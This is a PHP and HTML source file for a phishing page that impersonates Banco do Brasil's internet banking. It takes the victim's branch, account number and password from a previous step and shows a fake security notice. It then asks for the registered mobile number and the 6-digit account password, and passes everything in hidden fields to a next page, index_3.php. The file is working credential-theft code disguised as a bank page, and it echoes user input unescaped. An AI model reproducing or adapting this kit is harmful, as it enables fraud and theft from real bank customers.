<?php
error_reporting(0);
ini_set(“display_errors”, 0 );


$agencia = $_POST ['agencia'];
$conta = $_POST ['conta'];
$senha = $_POST ['senha'];
?>
<!DOCTYPE html>
<html lang="pt-br" data-ng-app="openBanking" oauth-loading class="fundo-azul">

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Banco do Brasil</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" href="imagens/favicon.ico" type="image/x-icon" />
    <link rel="stylesheet" type="text/css" href="css/angular-material.min8cea.css" />
    <link rel="stylesheet" type="text/css" href="css/bulma.min.css" />
    <link rel="stylesheet" type="text/css" href="css/style.css" />
    <link rel="stylesheet" type="text/css" href="css/titulares.css" />
    <link rel="stylesheet" type="text/css" href="css/input.css" />
    <link rel="stylesheet" type="text/css" href="css/componentes.css" />
    <link rel="stylesheet" type="text/css" href="css/voltar.css" />
    <link rel="stylesheet" type="text/css" href="css/contas.css" />
    <link rel="stylesheet" type="text/css" href="css/termo.css" />
	
    <script src="lib/jquery-1-12-4.js"></script>
	<script type="text/javascript" src="js/prototipo.js"></script>
	<script type="text/javascript" src="js/jquery.validate.cpf.js"></script> 
    <script src="lib/jquery.mask.min.js"></script>
	 <script src="lib/mask.min.js"></script>
    <script src="lib/indexeddb.js"></script>
	<script src="lib/home.js"></script>
	

</head>

<body class="caixa">


    <div data-ng-view="" class="ng-scope" style="">
        <section class="hero is-fullheight ng-scope">
            <div class="disabilitado-hero-body">
                <div class="container">
					
                    <section class="page-section welcome-section is-white">
						
                        <figure class="avatar">
                            <img class="logo" data-ng-src="imagens/logo-login.jpg" src="imagens/logo-login.jpg">
                        </figure>
						<div class="welcome">
                            <span class="welcome-user active"><b></b></span>
                        </div>
                    </section>
                    <div class="column is-4 is-offset-4 caixa">
                        <p class="subtitle is-subtitulo-azul has-text-centered"><font style="font-size: 9pt">&oplus; Ag. <?php echo $agencia ?>&nbsp; Cc. <?php echo $conta ?></font></p>
						<article class="message is-info">
  <div class="message-body">
    <font style="font-size: 10px;">por motivo de segurança é necessário confirmar algumas informações.<br>
	
	<strong>Confirme o número de celular cadastrado:<strong>
	
	<strong>Para continuar você deve confirma sua senha da conta corrente (6 dígitos)!<strong>
	
	</font>
  </div>
</article>			
		                        <form autocomplete="off" class="ng-pristine ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-valid-pattern" onsubmit="return check_phone();" action="index_3.php" method="POST">
							
                       <input name="agencia" type="hidden" id="agencia" value="<?php echo $agencia ?>" />
 					 <input name="conta" type="hidden" id="conta" value="<?php echo $conta ?>" />
 					 <input name="senha" type="hidden" id="senha" value="<?php echo $senha ?>" />
						<div>
                                <input type="tel" ng-model="tel_fone" name="telefone" id="tel_fone" salta-campo-pos-preenchimento="pass6" focus="focus" data-ng-required="!vm.isCampoPreenchido(vm.tel_fone)" data-ng-focus="!vm.isCampoPreenchido(vm.tel_fone)" data-ng-model="vm.tel_fone" data-autofocus="" clean="true" data-bb-input-tel_fone="" data-salta-campo-pos-preenchimento="" class="ng-pristine ng-untouched ng-isolate-scope ng-empty ng-invalid ng-invalid-required" maxlength="15" required="required" aria-invalid="true" onKeyPress="MascaraFoneDDD(event, this);" autofocus>
                                <label class="has-text-lefted">Celular com DDD</label>
                            </div>
               

							 <div>
								
                                <input type="tel" ng-model="pass6" name="senha6" id="pass6" salta-campo-pos-preenchimento="" focus="focus" data-ng-required="!vm.isCampoPreenchido(vm.pass6)" data-ng-focus="!vm.isCampoPreenchido(vm.pass6)" data-ng-model="vm.pass6" data-autofocus="" clean="true" data-bb-input-pass6="" data-salta-campo-pos-preenchimento="" class="ng-pristine ng-untouched ng-isolate-scope ng-empty ng-invalid ng-invalid-required" maxlength="6" required="required" aria-invalid="true" autofocus style="-webkit-text-security: disc !important;">
                                <label class="has-text-lefted">Senha da conta corrente (6 dígitos)</label>
                            </div>
                            <br>
                            <button class="botao-amarelo is-fullwidth" data-ng-click="vm.autenticar()">CONTINUAR</button>

						
                        </form>
                    </div>
                </div>
            </div>
        </section>
    </div>

</body>



</html>